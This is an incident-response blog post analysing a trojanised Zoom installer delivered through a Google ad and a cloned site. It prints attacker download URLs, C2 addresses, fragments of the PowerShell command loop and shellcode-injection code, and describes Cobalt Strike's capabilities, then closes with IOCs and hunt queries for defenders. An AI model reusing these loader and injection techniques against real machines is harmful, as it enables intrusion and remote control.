  <progress id="pwr-progress-bar" max="0" value="0"></progress>

  <div class="pwr-post-content">
    <span id="hs_cos_wrapper_post_body" class="hs_cos_wrapper hs_cos_wrapper_meta_field hs_cos_wrapper_type_rich_text" style="" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>On the 7<sup>th</sup> April 2021, Defender for Endpoint alerted on suspicious PowerShell execution by a Zoom process on a customer workstation:</p>
<!--more-->
<p><img src="https://www.inde.nz/hubfs/image-png.png" loading="lazy" style="margin-left: auto; margin-right: auto; display: block;"></p>
<p>Besides the fact that Zoom should not be dropping and executing arbitrary PowerShell scripts, this instance of Zoom was launched from a subfolder of %temp% rather than the standard Zoom client install path under %appdata% (i.e. <code>C:\Users\&lt;user&gt;\AppData\Roaming</code>):</p>
<p><img src="https://www.inde.nz/hubfs/image-png-1.png" loading="lazy" style="margin-left: auto; margin-right: auto; display: block;"></p>
<p>What follows is my investigation into the origin of this “aftermarket” Zoom install, and analysis of associated artifacts.</p>
<h2>Delivery</h2>
<p>A hunt query showed that Zoom.exe had originated from an 7zip archive produced by a self-extracting executable: ZoomPortable.exe. In learning this I recalled a conversation with a senior member of another&nbsp;security team&nbsp;who had seen the same set of files in a recent investigation, however the execution they observed did not progress as far as what I was now looking at. Neither of us could find any mention of a portable version of Zoom – either official or unofficial – so we worked together to dive into what we believed to be something rather spicy. I would highly recommend taking some time to read <a href="https://www.theta.co.nz/news-blogs/cyber-security-blog/pivoting-through-malicious-infrastructure-from-zoomportable-to-windscribe/" rel="noopener" target="_blank">their findings</a> too.</p>
<p>ZoomPortable.exe was downloaded from Chrome, as opposed to the more common vector of delivering malware: email. An important attribute of this file is that is signed with a legitimate, DigiCert issued certificate:</p>
<p><img src="https://www.inde.nz/hubfs/image-png-2.png" loading="lazy" style="margin-left: auto; margin-right: auto; display: block;"></p>
<p>As Zscaler is used by the organisation, I was able to correlate cloud proxy and endpoint data to determine that the file had been downloaded from <code>https[:]//veehy[.]com/download-zoom/</code> (149.56.14[.]50). The site was a perfect clone of zoom[.]us except for the “Download for Free” buttons:</p>
<p><img src="https://www.inde.nz/hubfs/image-png-3.png" loading="lazy" style="margin-left: auto; margin-right: auto; display: block;"></p>
<p>Preceding this was a click through <code>https[:]//linkx[.]ind[.]br/?utm_source=google&amp;utm_medium=cpc&amp;utm_campaign=g&amp;utm_content=506530145240&amp;utm_term=zoom</code> which led to an assumption that the vector for delivery was a Google Ad for Zoom (later corroborated by the user).</p>
<p>Execution of ZoomPortable.exe:</p>
<ul>
<li>Configures itself to autostart by making a shortcut to itself under <code>%appdata%\Microsoft\Windows\Start Menu\Programs\Startup</code></li>
<li>Drops zoom.7z in %temp% and extracts its contents into %temp%\zoom with 7za: <code>"7za.exe" x "C:\Users\&lt;user&gt;\AppData\Local\Temp\zoom.7z" -o"C:\Users\&lt;user&gt;\AppData\Local\Temp\zoom" -aos</code></li>
</ul>
<p>The extracted contents appear identical to a standard Zoom client install, with exception of the path they are extracted to and zoom.exe having a modified date much later than any other file:</p>
<p><img src="https://www.inde.nz/hubfs/image-png-Apr-10-2021-06-10-20-44-AM.png" loading="lazy" style="margin-left: auto; margin-right: auto; display: block;"></p>
<p>Unlike its legitimate version, this patched version of Zoom.exe has an idata section that is marked as writable, executable and potentially packed:</p>
<p><img src="https://www.inde.nz/hubfs/image-png-Apr-10-2021-11-57-13-08-PM.png" loading="lazy"></p>
<p>The function at 0x00442000 (the address of .idata) is one of the first called during startup:</p>
<p><img src="https://www.inde.nz/hubfs/image-png-Apr-11-2021-03-41-18-84-AM.png" loading="lazy" style="margin-left: auto; margin-right: auto; display: block;"></p>
<p><img src="https://www.inde.nz/hubfs/image-png-Apr-11-2021-03-41-32-83-AM.png" loading="lazy" style="margin-left: auto; margin-right: auto; display: block;"> Further below, around 0x0044227A, the string "b.ps1" is formed:</p>
<p><img src="https://www.inde.nz/hubfs/image-png-Apr-11-2021-01-28-00-09-AM.png" loading="lazy" style="margin-left: auto; margin-right: auto; display: block;"></p>
<p>After this is a test of EDX and a conditional jump, so a breakpoint is set here. The user %temp% path has been resolved and a URL is formed:</p>
<p><img src="https://www.inde.nz/hubfs/image-png-Apr-11-2021-04-07-46-82-AM.png" loading="lazy"></p>
<p>The call of EAX invokes Urlmon.URLDownloadToFile, storing the result of <code>http[:]//ec2-54-209-51-169.compute-1.amazonaws[.]com/awsstat/telemetry.php?t=3&amp;j=&lt;hostname&gt;</code> in <code>C:\Users\&lt;user&gt;\AppData\Local\Temp\b.ps1</code>:</p>
<p><img src="https://www.inde.nz/hubfs/image-png-Apr-11-2021-01-42-26-34-AM.png" loading="lazy"></p>
<p>Upon successful download of the script a reference to Kernel32.WinExec is stored in ECX and EDX is populated with the shell command required to run the script:</p>
<p><img src="https://www.inde.nz/hubfs/image-png-Apr-11-2021-01-51-27-39-AM.png" loading="lazy"></p>
<p>This command is executed by Kernel32.CreateProcess, launching the PowerShell process via cmd.exe:</p>
<p><img src="https://www.inde.nz/hubfs/image-png-Apr-11-2021-01-56-37-69-AM.png" loading="lazy"></p>
<p>From the perspective of the user, nothing appears out of place: the standard Zoom launcher appears for them:</p>
<p><img src="https://www.inde.nz/hubfs/image-png-Apr-11-2021-01-26-11-30-AM.png" loading="lazy" style="margin-left: auto; margin-right: auto; display: block;"></p>
<h2>Execution</h2>
<p>Execution of b.ps1 was first seen 6 days after the first run of zoom.exe, suggesting the remote host may have been profiling targets and limiting distribution of the script. In other reported cases, this delay varies between 2-7 days. The initial PowerShell script – b.ps1 – was inspected by AMSI and logged by Defender, and certainly aroused suspicion:</p>
<p><img src="https://www.inde.nz/hubfs/image-png-Apr-10-2021-06-10-52-02-AM.png" loading="lazy" style="margin-left: auto; margin-right: auto; display: block;"></p>
<p>Key observations were:</p>
<ul>
<li>The use of .NET reflection.</li>
<li>Extensive obfuscation of variables.</li>
<li>Random URI path selection (as used by Cobalt Strike and Empire).</li>
<li>Connection to an IP unrelated to Zoom infrastructure.</li>
</ul>
<p>Two versions of b.ps1 were encountered, each with a unique user agent and set of URI paths:</p>
<ul>
<li>139.60.161[.]60:
<ul>
<li><strong>Paths:</strong> /en-us/telemetry/, /en-us/cdn/content, /en-us/info-browser/</li>
<li><strong>User agent:</strong> Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0</li>
</ul>
</li>
<li>45.146.164[.]111:
<ul>
<li><strong>Paths:</strong> /en-us/usage/, /en-us/cdn/content, /en-us/info-user/</li>
<li><strong>User agent:</strong> Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/211011011 Firefox/78.0</li>
</ul>
</li>
</ul>
<p>The script was found to operate in stages determined by the response from the remote host. Basic user and system information is first sent to the host in a while loop with a 10 second wait in between each iteration:</p>
<ul>
<li><strong>User and machine name:</strong> <code><br>[Environment]::UserDomainName+'|'+[Environment]::UserName+'|'+[Environment]::MachineName;</code></li>
<li><strong>Local IP address:</strong> <code><br>(Get-WmiObject Win32_NetworkAdapterConfiguration|Where{$_.IPAddress}|Select -Expand IPAddress);</code></li>
<li><strong>Operating system:</strong><code> <br>(Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];</code></li>
<li><strong>Process name:</strong> <code><br>[System.Diagnostics.Process]::GetCurrentProcess();</code></li>
</ul>
<p>While the response from the host is empty or equal to “exit” the loop will continue, otherwise the response will form a session ID to be sent in the headers of subsequent requests. Another loop begins with an empty request, presumably to validate the session ID. If it is accepted and the response is “xxxxx” the next request will include both the session ID and detail of the execution context:</p>
<p><code>([text.encoding]::UTF8).GetBytes("Running as user " + $env:username + " on " + $env:computername + "`n`n" + 'PS ' + (Get-Location).Path + '&gt;')</code></p>
<p>This line of code, alongside some others nearby, look to have been borrowed from an open-sourced script, Invoke-PowerShellTcp: <a href="https://github.com/tokyoneon/Chimera/blob/master/shells/Invoke-PowerShellTcp.ps1">https://github.com/tokyoneon/Chimera/blob/master/shells/Invoke-PowerShellTcp.ps1</a>. It is expected that this is called at least once, and followed by a response that is neither empty, “xxxxx” or “exit”. Other valid responses form commands that can be either standalone or followed by space separated variables:</p>
<ul>
<li><strong>dir:</strong>
<ul>
<li><strong>No variables:</strong> <code><br>Get-ChildItem -force | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name</code></li>
<li><strong>With variables:</strong> <br><code>Get-ChildItem $ca -Force -ErrorAction Stop | select mode,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }},lastwritetime,length,name</code></li>
</ul>
</li>
<li><strong>getpid:</strong> <code><br>[System.Diagnostics.Process]::GetCurrentProcess()</code></li>
<li><strong>whoami:</strong> <br><code>[Security.Principal.WindowsIdentity]::GetCurrent().Name</code></li>
<li><strong>hostname:</strong> <code><br>[System.Net.Dns]::GetHostByName(($env:computerName))</code></li>
<li><strong>default:</strong>
<ul>
<li><strong>No variables:</strong> <br><code>IEX $c</code></li>
<li><strong>With variables:</strong><code> <br>IEX "$c $ca"</code></li>
</ul>
</li>
</ul>
<p>In effect, the “default” option is used for arbitrary PowerShell execution. This led to multiple additional detections:</p>
<p><img src="https://www.inde.nz/hubfs/image-png-Apr-10-2021-06-14-13-35-AM.png" loading="lazy" style="margin-left: auto; margin-right: auto; display: block;"></p>
<p>In the following example, a command requests and runs an additional script (where IEX is the alias for Invoke-Expression):</p>
<p><img src="https://www.inde.nz/hubfs/image-png-Apr-10-2021-06-14-24-07-AM.png" loading="lazy" style="margin-left: auto; margin-right: auto; display: block;"></p>
<p>“okm” is a fairly standard shellcode injection script similar to that used in <a href="https://gist.github.com/macostag/f62b688ace243cc7ed426c133ba3efae" rel="noopener" target="_blank">Metasploit</a>&nbsp;and <a href="https://cloud.tencent.com/developer/article/1739261" rel="noopener" target="_blank">Cobalt Strike</a>:</p>
<ul>
<li>Convert hex-encoded shellcode to a byte array: <code><br>[Byte[]] $pdas = [byte[]] -split ($bend -replace '..', '0x$&amp; ')</code></li>
</ul>
<ul>
<li>Allocate space in memory for the shellcode with VirtualAlloc: <code>$ufvt.Invoke([IntPtr]::Zero, $pdas.Length + 1, 0x3000, 0x40)</code></li>
</ul>
<ul>
<li>Load the shellcode into memory:<br><code>[System.Runtime.InteropServices.Marshal]::Copy($pdas, 0, $dotn, $pdas.Length)</code></li>
</ul>
<ul>
<li>Build additional shellcode to invoke “ExitThread”:<br><code>$joas = grqoh kernel32.dll ExitThread</code><br><code>$dglt = dswro $dotn $joas 64</code></li>
</ul>
<ul>
<li>Also allocate space for this shellcode and copy it into memory:<br><code>$xuwf = $ufvt.Invoke([IntPtr]::Zero, $dglt.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)</code><br><code>[System.Runtime.InteropServices.Marshal]::Copy($dglt, 0, $xuwf, $dglt.Length)</code></li>
</ul>
<ul>
<li>Execute the shellcode as a new thread then exit:<br><code>$zcbu.Invoke([IntPtr]::Zero, 0, $xuwf, $dotn, 0, [IntPtr]::Zero)</code></li>
</ul>
<p>When analysing the shellcode, it appeared that the C2 server (95.179.138[.]181:443) had already been taken down:<br><img src="https://www.inde.nz/hubfs/image-png-Apr-10-2021-06-16-19-32-AM.png" loading="lazy" style="margin-left: auto; margin-right: auto; display: block;">Thankfully, this was detected by Defender as Cobalt Strike, so that at least gave some insight into what the response from this host likely was (and also avoided tragedy):</p>
<p><img src="https://www.inde.nz/hubfs/image-png-Apr-10-2021-06-16-49-65-AM.png" loading="lazy" style="margin-left: auto; margin-right: auto; display: block;"></p>
<h2>What is Cobalt Strike?</h2>
<p><a href="https://www.cobaltstrike.com/" rel="noopener" target="_blank">Cobalt Strike</a> (<a href="https://attack.mitre.org/software/S0154/">S0154</a>) is commercial software used for adversary emulation and red teaming that has become a go-to tool for threat actors. It’s capabilities include:</p>
<ul>
<li><strong>Reconnaissance:</strong> quietly profile victims and other hosts on the network.</li>
<li><strong>Post-Exploitation:</strong> interact with victims through the Beacon console, over VNC or RDP. Run commands, take screenshots, capture keystrokes, dump credentials from memory, scan the local network, etc.</li>
<li><strong>Covert Communications:</strong> malleable Command and Control profiles enable you to blend in with other software used on the network. Transport options include HTTP, HTTPS, DNS and SMB.</li>
<li><strong>Phishing:</strong> email messages can be imported, weaponised and sent.</li>
<li><strong>Initial Access:</strong> web servers can be hosted for drive-by downloads on cloned websites, or a variety of file payloads can be crafted for external delivery.</li>
<li><strong>Browser Pivoting:</strong> proxy local browsing through a victim to bypass geofencing, IP allowlisting, multi-factor authentication and other restrictions.</li>
</ul>
<p style="text-align: center;"><img src="https://www.inde.nz/hubfs/image-png-Apr-10-2021-06-18-37-74-AM.png" loading="lazy" style="margin-left: auto; margin-right: auto; display: block;"><span style="font-size: 12px;">Source: <a href="https://blog.cobaltstrike.com/2016/09/22/cobalt-strike-3-5-unix-post-exploitation/">https://blog.cobaltstrike.com/2016/09/22/cobalt-strike-3-5-unix-post-exploitation/</a></span></p>
<h2>Recommendations</h2>
<p>This campaign has reinforced the necessity of adopting a defense in depth approach to cybersecurity and investing in best-of-breed security technology. It was only through their adoption of <a href="https://www.zscaler.com/" rel="noopener" target="_blank">Zscaler</a> cloud proxy and <a href="https://www.microsoft.com/en-nz/microsoft-365/security/endpoint-defender" rel="noopener" target="_blank">Microsoft Defender for Endpoint</a> (formerly Defender Advanced Threat Protection) EDR that the customer managed to come out of this incident unscathed. While execution did occur for some time before initial detection, events that would otherwise have resulted in impact were mitigated. Traditional endpoint protection would unlikely have provided adequate coverage and the organisation would be facing a long-term compromise.</p>
<p>As an analyst it also drove home the importance of industry collaboration, understanding normal OS behaviour and being familiar with the TTP’s of common adversary tooling. Several organisations I spoke to who also saw instances of this deemed it a false positive because “it looks and feels like Zoom”.</p>
<p>Users of Defender for Endpoint can use the following hunt query to assess their environment for indicators of compromise:</p>
<pre>search in (DeviceFileEvents, DeviceNetworkEvents) RemoteIP in ("<code>54[.]209[.]51[.]169</code>", "139.60.161[.]60", "45.146.164[.]111", "95.179.138[.]181") or SHA256 in ("910aed5530f18782d8265d41a2bda49f074dceaff76223e63500a6e4671cfe46", "fd03b531ad1d8d7358b7b50912841f81b6ea6e4e364ca6af8f0dc61aa7d3d152", "df8659f990176e4845615486055305a5dc7024c732850bc3043c64e8393dc38b", "122fc6d2eb88bdce215fd0a379178d66ce816b91b77791d340ff673448d21030", "ee211bfbd506cb2877ae6f7b1db496ef87bd4462ddcef1ef872798be309dc943")</pre>
<p><strong>Note:</strong> defang IP addresses before running the query.</p>
<p>Impacted hosts can be further investigated with these queries:</p>
<pre>let HostName = "HOSTNAME";<br>DeviceFileEvents<br>| where DeviceName startswith HostName<br>| where FileName in ("1.ps1", "b.ps1", "zoom.7z", "ZoomPortable.exe")<br><br>let HostName = "HOSTNAME";<br>let ZoomPath = @"C:\Users\USERNAME\AppData\Local\Temp\zoom\";<br>search in (DeviceFileEvents, DeviceProcessEvents) DeviceName startswith HostName<br>| where FolderPath startswith ZoomPath or InitiatingProcessFolderPath startswith ZoomPath<br>| where InitiatingProcessFileName != "7za.exe" and ActionType !in ("FileModified")<br><br>let HostName = "HOSTNAME";<br>let ExecString = "-exec bypass /W 1";<br>search in (DeviceFileEvents, DeviceNetworkEvents, DeviceProcessEvents) DeviceName startswith HostName<br>| where ProcessCommandLine contains ExecString or InitiatingProcessCommandLine contains ExecString<br>| where FileName !startswith "__PSScriptPolicyTest" and RemoteIP != "127.0.0.1" and RemoteUrl !contains "zscloud.net"<br><br>let HostName = "HOSTNAME";<br>DeviceEvents<br>| where DeviceName startswith HostName<br>| where ActionType == "PowerShellCommand" and InitiatingProcessCommandLine has_any ("b.ps1", "1.ps1")</pre>
<p>You can find a list of others involved in the investigation and a link to a more comprehensive set of IoC’s in the tweet where I first announced this finding: <a href="https://twitter.com/phage_nz/status/1379967916116877313" rel="noopener" target="_blank">https://twitter.com/phage_nz/status/1379967916116877313</a>.</p>
